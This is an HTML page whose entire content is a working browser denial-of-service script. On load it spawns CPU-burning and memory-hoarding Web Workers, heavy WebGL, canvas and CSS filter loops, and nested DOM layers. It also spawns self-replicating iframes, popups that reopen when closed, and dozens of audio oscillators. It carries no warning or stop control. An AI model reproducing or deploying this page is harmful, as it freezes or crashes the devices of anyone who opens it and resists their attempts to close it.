<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title></title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
      width: 100%; height: 100%; overflow: hidden;
      background: #000;
    }
    #nest {
      position: fixed; inset: 0; display: grid;
      grid-template-columns: repeat(4, 1fr);
      grid-template-rows: repeat(3, 1fr);
      gap: 0; opacity: .35;
    }
    #nest iframe {
      width: 100%; height: 100%; border: 0; background: #000;
    }
    #stage {
      position: fixed; inset: -15%; width: 130%; height: 130%;
      pointer-events: none;
      filter: contrast(2.5) saturate(4);
      will-change: filter, transform;
    }
    canvas { position: absolute; inset: 0; width: 100%; height: 100%; mix-blend-mode: screen; }
    .blob {
      position: absolute; width: 50vw; height: 50vh; border-radius: 40%;
      background: radial-gradient(circle, #ff0, #f0f, #0ff, transparent 70%);
      filter: blur(35px) contrast(3);
      animation: spin .2s linear infinite, pulse .1s ease-in-out infinite alternate;
      mix-blend-mode: color-dodge; will-change: transform, filter;
    }
    @keyframes spin { to { transform: rotate(360deg) scale(1.5); } }
    @keyframes pulse {
      from { filter: blur(20px) hue-rotate(0deg); }
      to { filter: blur(70px) hue-rotate(180deg); }
    }
    #dom-bomb { position: absolute; inset: 0; overflow: hidden; }
    #dom-bomb .layer {
      position: absolute; width: 250vmax; height: 250vmax; left: -80vmax; top: -80vmax;
      backdrop-filter: blur(50px) contrast(3) saturate(4);
      -webkit-backdrop-filter: blur(50px) contrast(3) saturate(4);
      background: linear-gradient(45deg, rgba(255,0,0,.18), rgba(0,255,255,.18), rgba(255,0,255,.18));
      box-shadow: 0 0 80px 40px rgba(255,0,80,.3), inset 0 0 100px rgba(0,255,255,.2);
      animation: thrash .12s linear infinite; will-change: transform, filter;
    }
    #dom-bomb .layer div {
      position: absolute; inset: 3%; width: 94%; height: 94%;
      backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
      animation: thrash .15s linear infinite reverse;
    }
    @keyframes thrash {
      0% { transform: rotate(0deg) scale(1); }
      50% { transform: rotate(180deg) scale(1.3); }
      100% { transform: rotate(360deg) scale(.95); }
    }
    body.slave #nest { display: none; }
  </style>
</head>
<body>
  <div id="nest"></div>
  <div id="stage"><div id="dom-bomb"></div></div>

  <script>
    const params = new URLSearchParams(location.search);
    const IS_SLAVE = params.get('slave') === '1';
    const slaveHref = (() => {
      const u = new URL(location.href);
      u.searchParams.set('slave', '1');
      return u.href;
    })();

    if (IS_SLAVE) document.body.classList.add('slave');

    const stage = document.getElementById('stage');
    const bomb = document.getElementById('dom-bomb');
    const cores = navigator.hardwareConcurrency || 8;
    const workers = [];
    const memChunks = [];
    let memMB = 0;
    let frames = 0;

    function touchPages(buf) {
      for (let i = 0; i < buf.length; i += 4096) buf[i] = i & 255;
    }

    function eatMemory(mb) {
      mb = mb || 64;
      try {
        const u8 = new Uint8Array(mb * 1024 * 1024);
        touchPages(u8);
        memChunks.push(u8);
        memChunks.push(new Float64Array(mb * 128 * 1024));
        memMB += mb + (mb * 128 * 1024 * 8) / 1048576;
      } catch (_) {
        try {
          const u8 = new Uint8Array(8 * 1024 * 1024);
          touchPages(u8);
          memChunks.push(u8);
          memMB += 8;
        } catch (__) {}
      }
    }

    const cpuSrc = `
      const N = 1024 * 384;
      const a = new Float64Array(N), b = new Float64Array(N);
      let n = Math.random();
      function burn() {
        for (let i = 0; i < N; i++) {
          n = Math.sin(n + a[i]) * Math.cos(b[i] * 1.1) + Math.sqrt(Math.abs(n) + 1e-9);
          a[i] = n; b[i] = n * 1.01;
        }
        let s = '';
        for (let i = 0; i < 300; i++) s += (n + i).toString(36);
        JSON.parse(JSON.stringify({ n, s: s.slice(0, 1500) }));
        postMessage(1);
        setTimeout(burn, 0);
        Promise.resolve().then(burn);
      }
      burn();
      setInterval(() => { let x = 1; for (let i = 0; i < 3e6; i++) x = Math.sin(x); }, 1);
    `;
    const cpuUrl = URL.createObjectURL(new Blob([cpuSrc], { type: 'application/javascript' }));

    const ramSrc = `
      const hold = [];
      let mb = 0;
      function alloc() {
        try {
          const u8 = new Uint8Array(64 * 1024 * 1024);
          for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
          hold.push(u8);
          hold.push(new Float64Array(4 * 1024 * 1024));
          mb += 96;
          postMessage(mb);
        } catch (e) {
          try {
            const u8 = new Uint8Array(8 * 1024 * 1024);
            for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
            hold.push(u8); mb += 8; postMessage(mb);
          } catch (_) {}
        }
        setTimeout(alloc, 4);
      }
      alloc();
      setInterval(alloc, 8);
    `;
    const ramUrl = URL.createObjectURL(new Blob([ramSrc], { type: 'application/javascript' }));

    function spawnWorkers(cpuN, ramN) {
      for (let i = 0; i < cpuN; i++) {
        try { workers.push(new Worker(cpuUrl)); } catch (_) {}
      }
      for (let i = 0; i < ramN; i++) {
        try {
          const w = new Worker(ramUrl);
          w._mb = 0;
          w.onmessage = e => { w._mb = e.data | 0; };
          workers.push(w);
        } catch (_) {}
      }
    }

    function spawnDomLayer() {
      const wrap = document.createElement('div');
      wrap.className = 'layer';
      wrap.style.left = (Math.random() * 40 - 20) + '%';
      wrap.style.top = (Math.random() * 40 - 20) + '%';
      let cur = wrap;
      const depth = IS_SLAVE ? 50 : 20;
      for (let i = 0; i < depth; i++) {
        const c = document.createElement('div');
        cur.appendChild(c);
        cur = c;
      }
      bomb.appendChild(wrap);
    }

    function startVisualBurn(level) {
      const blobN = level > 1 ? 36 : 12;
      const canvasN = level > 1 ? 8 : 3;
      for (let i = 0; i < blobN; i++) {
        const el = document.createElement('div');
        el.className = 'blob';
        el.style.left = (Math.random() * 90) + '%';
        el.style.top = (Math.random() * 90) + '%';
        stage.appendChild(el);
      }
      const canvases = [], ctxs = [], imgs = [];
      for (let i = 0; i < canvasN; i++) {
        const c = document.createElement('canvas');
        c.width = level > 1 ? 1400 : 800;
        c.height = level > 1 ? 800 : 450;
        stage.appendChild(c);
        canvases.push(c);
        const ctx = c.getContext('2d', { willReadFrequently: true });
        ctxs.push(ctx);
        imgs.push(ctx.createImageData(c.width / 2, c.height / 2));
      }

      const glObjs = [];
      const glCount = level > 1 ? 2 : 1;
      for (let g = 0; g < glCount; g++) {
        const c = document.createElement('canvas');
        c.width = 1920; c.height = 1080;
        stage.appendChild(c);
        const gl = c.getContext('webgl', { antialias: true, powerPreference: 'high-performance' });
        if (!gl) continue;
        const vs = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vs, 'attribute vec2 a;varying vec2 v;void main(){v=a;gl_Position=vec4(a,0.,1.);}');
        gl.compileShader(vs);
        const fs = gl.createShader(gl.FRAGMENT_SHADER);
        const iters = level > 1 ? 56 : 32;
        gl.shaderSource(fs, `
          precision highp float; varying vec2 v; uniform float t;
          void main(){
            vec2 p=v*50.; float n=0.;
            for(int i=0;i<${iters};i++){
              float fi=float(i);
              n+=sin(p.x*fi*.12+t)*cos(p.y*fi*.16-t);
              float c=cos(t*.25),s=sin(t*.25);
              p=mat2(c,-s,s,c)*p*1.07;
            }
            gl_FragColor=vec4(.5+.5*sin(n+t),.5+.5*cos(n*1.8),.5+.5*sin(n*2.5-t),1.);
          }`);
        gl.compileShader(fs);
        const prog = gl.createProgram();
        gl.attachShader(prog, vs); gl.attachShader(prog, fs); gl.linkProgram(prog);
        gl.useProgram(prog);
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
        const loc = gl.getAttribLocation(prog, 'a');
        gl.enableVertexAttribArray(loc);
        gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
        glObjs.push({ gl, prog, canvas: c });
      }

      const mainA = new Float64Array(level > 1 ? 512 * 512 : 128 * 512);
      function mainBurn(ms) {
        const end = performance.now() + ms;
        let x = Math.random();
        while (performance.now() < end) {
          for (let i = 0; i < mainA.length; i++) {
            x = Math.sin(x + mainA[i]);
            mainA[i] = x;
          }
        }
      }

      for (let i = 0; i < (level > 1 ? 40 : 10); i++) spawnDomLayer();

      function tick(t) {
        frames++;
        mainBurn(level > 1 ? 10 : 4);
        for (let ci = 0; ci < ctxs.length; ci++) {
          const ctx = ctxs[ci], img = imgs[ci], c = canvases[ci];
          if (!ctx || !img) continue;
          const d = img.data;
          const tt = t * 0.01 + ci;
          for (let i = 0; i < d.length; i += 4) {
            d[i] = (Math.sin(i * 0.01 + tt) * 127 + 128) | 0;
            d[i + 1] = (Math.cos(i * 0.012 - tt) * 127 + 128) | 0;
            d[i + 2] = (Math.sin(i * 0.008 + tt * 2) * 127 + 128) | 0;
            d[i + 3] = 200;
          }
          ctx.putImageData(img, 0, 0);
          ctx.filter = 'blur(4px) contrast(200%)';
          ctx.globalCompositeOperation = 'lighter';
          ctx.drawImage(c, -20, -20, c.width + 40, c.height + 40);
        }
        for (const g of glObjs) {
          g.gl.useProgram(g.prog);
          g.gl.uniform1f(g.gl.getUniformLocation(g.prog, 't'), t * 0.001);
          for (let p = 0; p < (level > 1 ? 10 : 4); p++) {
            g.gl.viewport(0, 0, g.canvas.width, g.canvas.height);
            g.gl.drawArrays(g.gl.TRIANGLE_STRIP, 0, 4);
          }
        }
        if (frames % 2 === 0) spawnDomLayer();
        if (level > 1) eatMemory(64);
        stage.style.filter = `contrast(${2 + Math.random()}) saturate(${3 + Math.random() * 3}) hue-rotate(${frames % 360}deg)`;
        requestAnimationFrame(tick);
      }
      requestAnimationFrame(tick);

      if (level > 1) {
        setInterval(() => eatMemory(64), 8);
        setInterval(() => spawnDomLayer(), 25);
        setInterval(() => {
          try { workers.push(new Worker(cpuUrl)); } catch (_) {}
          try {
            const w = new Worker(ramUrl);
            w._mb = 0;
            w.onmessage = e => { w._mb = e.data | 0; };
            workers.push(w);
          } catch (_) {}
        }, 120);
      }
    }

    if (IS_SLAVE) {
      for (let i = 0; i < 20; i++) eatMemory(64);
      spawnWorkers(Math.max(24, cores * 4), Math.max(8, cores));
      startVisualBurn(2);
      try {
        const ac = new (window.AudioContext || window.webkitAudioContext)();
        for (let i = 0; i < 48; i++) {
          const o = ac.createOscillator(), g = ac.createGain(), f = ac.createBiquadFilter();
          f.type = 'bandpass'; f.frequency.value = 100 + i * 80; f.Q.value = 25;
          g.gain.value = 0.0003;
          o.type = i % 2 ? 'sawtooth' : 'square';
          o.frequency.value = 40 + i * 33;
          o.connect(f); f.connect(g); g.connect(ac.destination);
          o.start();
        }
        ac.resume().catch(() => {});
      } catch (_) {}
      setInterval(() => {
        try { parent.postMessage({ type: 'stress-alive' }, '*'); } catch (_) {}
      }, 500);
    }

    if (!IS_SLAVE) {
      const nest = document.getElementById('nest');
      const iframes = [];
      const pops = [];

      spawnWorkers(Math.max(8, cores), Math.max(4, cores / 2 | 0));
      for (let i = 0; i < 8; i++) eatMemory(64);
      startVisualBurn(1);

      function addIframe() {
        const f = document.createElement('iframe');
        f.src = slaveHref + '&t=' + Date.now() + Math.random();
        nest.appendChild(f);
        iframes.push(f);
        return f;
      }

      function addPopup() {
        const w = window.open(
          slaveHref + '&t=' + Date.now() + Math.random(),
          'stress_' + Date.now() + '_' + Math.random().toString(36).slice(2),
          'width=400,height=300,left=' + ((pops.length * 40) % 800) + ',top=' + ((pops.length * 30) % 500)
        );
        if (w) pops.push(w);
        return w;
      }

      // Auto-start: iframes + popup attempt
      for (let i = 0; i < 12; i++) addIframe();
      for (let i = 0; i < 6; i++) addPopup();

      // Click anywhere also tries more popups (browser often blocks until gesture)
      document.addEventListener('click', () => {
        for (let i = 0; i < 4; i++) addPopup();
        for (let i = 0; i < 2; i++) addIframe();
      });

      setInterval(() => {
        for (let i = 0; i < iframes.length; i++) {
          const f = iframes[i];
          let dead = false;
          try {
            if (!f.contentWindow) dead = true;
            else void f.contentDocument;
          } catch (_) { dead = true; }
          if (dead) {
            try { f.remove(); } catch (_) {}
            iframes[i] = addIframe();
          }
        }
        for (let i = 0; i < pops.length; i++) {
          if (!pops[i] || pops[i].closed) pops[i] = addPopup();
        }
        eatMemory(32);
      }, 800);

      setInterval(() => {
        if (!iframes.length) return;
        const i = frames % iframes.length;
        try { iframes[i].remove(); } catch (_) {}
        iframes[i] = addIframe();
      }, 8000);
    }
  </script>
</body>
</html>
